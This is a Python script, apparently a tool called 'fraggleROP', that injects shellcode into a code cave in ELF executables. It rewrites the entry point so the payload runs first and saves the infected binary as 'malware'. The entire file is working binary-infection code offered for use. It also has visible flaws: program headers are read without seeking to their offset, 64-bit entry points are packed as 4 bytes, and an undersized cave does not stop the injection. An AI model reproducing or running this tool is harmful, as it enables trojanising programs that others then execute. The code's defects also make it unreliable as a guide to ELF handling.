#!/usr/bin/python3
import binascii
import argparse
import sys
import struct
import logging
from ctypes import *
from os import path

from elf import Elf64_Ehdr
from elf import Elf64_Phdr
from elf import Elf32_Ehdr
from elf import Elf32_Phdr


def logger_setup(level):
    '''setup logging for display'''
    logger = logging.getLogger('fraggleROP')
    # setup stream handler to stderr output
    ch = logging.StreamHandler()
   
    # Verbose output if DEBUG is passed else normal
    if level == "DEBUG":
        logger.setLevel(logging.DEBUG)
        ch.setLevel(logging.DEBUG)
    elif level == "ERROR":
        logger.setLevel(logging.ERROR)
        ch.setLevel(logging.ERROR)
    else:
        logger.setLevel(logging.INFO)
        ch.setLevel(logging.INFO)

    # add handler to loggerger for display
    logger.addHandler(ch)

    return logger

def parse_structures(file):
    '''Parse the ELF header as well as the program headers
       contained within a provided ELF binary. Returns an
       Elf[32|64]_Ehdr structure as well as a list of program
       structures (Elf[32|64]_Phdr) that are marked as loadable.'''
    
    # Initial grab of ELF header for arch detection
    elf = Elf64_Ehdr()
    f =  open(args.file,'rb')
    f.readinto(elf)
    
    # runs the parse method which allows human readable field printing
    # example: CLASS: ELF32 instead of Class: 1
    elf.parse()

    # determine if 32 or 64 bit and build program header list
    if elf.elf_class == "ELF32":
        
        #Change to 32bit and grab the header with the proper struct
        elf = Elf32_Ehdr()
        f.seek(0)
        f.readinto(elf)
        elf.parse()

        #Build list of the available program headers. This needs
        #to be split between 32 and 64 bit due to difference in header
        #lengths between the two
        phdr_list = []
        for phnum in range(elf.e_phnum):
            phdr = Elf32_Phdr()
            f.readinto(phdr)
            phdr_list.append(phdr)
        
    else:

        phdr_list = []
        for phnum in range(elf.e_phnum):
            phdr = Elf64_Phdr()
            f.readinto(phdr)
            phdr_list.append(phdr)

    f.close()


    logger.info(elf)
    logger.info("Number of sections found: %d" % len(phdr_list))

    # iterate through program header list and display if verbose mode enabled
    # pop out the sections that are not marked as loadable for easier locating
    # of an ideal codecave
    load_list = []
    for phdr in phdr_list:
        logger.debug(phdr_list.index(phdr)+1)
        logger.debug(phdr)
        if phdr.p_type == 1:
            logger.debug("Section marked as LOAD: Retaining.")
            logger.debug("")
            load_list.append(phdr)
        else:
            logger.debug("Not a LOAD section.")
            logger.debug("")

    logger.info("Number of LOAD sections: %d" % len(load_list))

    return elf,load_list

def locate_codecave(load_sections,payload_sz):
    '''Calculates the distance between the .text
       segment of the victim ELF and the closest
       LOAD segment which should provide the
       gap where our target code cave resides.'''

    text_end = 0

    # locate .text section
    for section in load_sections:

        if section.p_flags & 0x1:

            logger.debug("Found .text segment.")
            logger.debug(section)
            text_seg = section
            text_end = section.p_offset + section.p_filesz
            logger.debug(".text end is: %x" % text_end)

    # Remove .text segment prior to comparing to remaining sections
    load_sections.remove(text_seg)
    
    # initialize arbitrarily large gap for initial comparison
    gap = 0xffffffff

    # calculate the next offset to be 16 byte aligned
    # ex. 0x40000 vice 0x3fffff
    mem_align = text_end + (16 - (text_end & 0xf))
    logger.debug("code cave alignment is: %x" % mem_align)

    # calculate distance between .text and next closest section
    # save the lowest gap size as long as it is greater than 0
    for section in load_sections:

        text_dist = section.p_offset - mem_align
        if text_dist < gap and text_dist > 0:

            logger.debug("Found LOAD segment close to .text (offset: %x)" % section.p_offset)
            logger.debug(section)
            gap = text_dist

    logger.info(".txt segment gap at offset %x (%d bytes available)" % (text_end, gap))
    
    # If the code cave gap is too small for the payload: logger error and exit
    try:
        if gap < payload_sz:
            logger.error("Failed to locate a code cave large enough to inject the payload.")
    except:
        sys.exit()

    return text_seg

def inject_shellcode(elf,txt_segment,payload,args):

    global target_file

    # calculate location to inject payload
    mem_align = txt_segment.p_filesz + (16 - (txt_segment.p_filesz & 0xf))
    cave_offset = txt_segment.p_offset + mem_align
    cave_entry  = txt_segment.p_vaddr + mem_align
    logger.debug("cave offset at: %x" % cave_offset)
    logger.debug("cave memory load offset at: %x" % cave_entry)

    # rebuild payload with the target binary's previous entry point
    #shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]
    shellcode = payload[:0xe] + struct.pack("<I",elf.e_entry) + payload[0x12:]

    logger.debug("New payload size is: %d" % len(shellcode))

    # read in the target binary in order to inject payload into
    with open(target_file,'rb') as f:
        data = f.read()

    # change the binary entry point to hold the address of the injected shellcode
    data = data[:0x18] + struct.pack("<I",cave_entry) + data[0x1c:]

    # Insert our shellcode into the data
    data = data[:cave_offset] + shellcode + data[(cave_offset + len(shellcode)):]

    if args.test:
        with open("test_shellcode","wb") as f:
            f.write(shellcode)
        logger.debug("Test shell code successfully generated.")

    else:

        # write to new file
        with open("malware","wb") as f:
            f.write(data)
    
        logger.info("Shellcode successfully injected into: %s" % target_file)
        

def shellcode(payload):
    '''Dynamically determine the entry point for the payload
       binary and grab the shellcode minus the overhead'''

    # grab the elf header and then read the entire binary into data
    with open(payload,'rb') as f:
        shell_elf = Elf64_Ehdr()
        f.readinto(shell_elf)
        f.seek(0)
        data = f.read()

    # calculate the offset and grab only the last byte (assuming small binary)
    offset = shell_elf.e_entry & 0xff
    logger.debug("Shellcode offset located at 0x%x" % offset)
    
    # start at the offset and read the entire section
    shellcode = data[offset:]
    logger.info("Shellcode %dB in size." % len(shellcode))

    return shellcode

def file_check(file_name):
    if path.exists(file_name):
        return file_name
    else:
        print("failiing in file check.")
        print("Failed to open file.")
        sys.exit()

'''def change_loggerlevel(level):
    context.logger_level = level'''

def args():

    parser = argparse.ArgumentParser(
            description="Utility to inject shellcode into a \"code cave\" section of an ELF binary. "\
                                                 "Default behavior (only providing a FILE) will parse the binary and print "\
                                                 "the sections if VERBOSE is enabled.",
            formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-l", dest="locate", action="store_true",
            help="Locate code cave offsets in provided file")
    parser.add_argument("-i", dest="implant", action="store_true",
            help="Implant shellcode into code cave.")
    parser.add_argument("-t", dest="test", action="store_true",
            help="Test building the new shellcode. Do not actually inject.")
    parser.add_argument("-v", dest="verbose", action="store_true",
            help="Enable verbose loggerging.")
    parser.add_argument("-s", dest="silent", action="store_true",
            help="Enable silent mode.")
    parser.add_argument("-c", dest="shellcode", type=file_check, default="shellcode",
            help="Shellcode to inject into ELF code cave.")
    parser.add_argument("file", metavar="FILE", type=file_check,
            help="Provide a file to check for code cave.")

    return parser.parse_args()

if __name__ == '__main__':
    
    global target_file
    global logger

    args = args()

    target_file = args.file

    # determine loggerging level based on arguments
    if args.verbose:
        logger = logger_setup("DEBUG")
    elif args.silent:
        logger = logger_setup("ERROR")
    else:
        logger = logger_setup("NULL")
    
    # attempt to parse the target binary
    try:
        elf,load_sections = parse_structures(args.file)
    except:
        print("Error parsing ELF.")
        sys.exit()
    
    # calculate shellcode size and collect only the payload portion of the file
    if args.shellcode:
        code = shellcode(args.shellcode)
    else:
        code = shellcode("shellcode")

    # locate offsets and implant if possible and indicated at the commandline
    if args.locate or args.implant or args.test:
        logger.info("Attempting to locate code cave in file: %s" % args.file)

        text_segment = locate_codecave(load_sections,len(code))

        if args.implant or args.test:
            inject_shellcode(elf,text_segment,code,args)



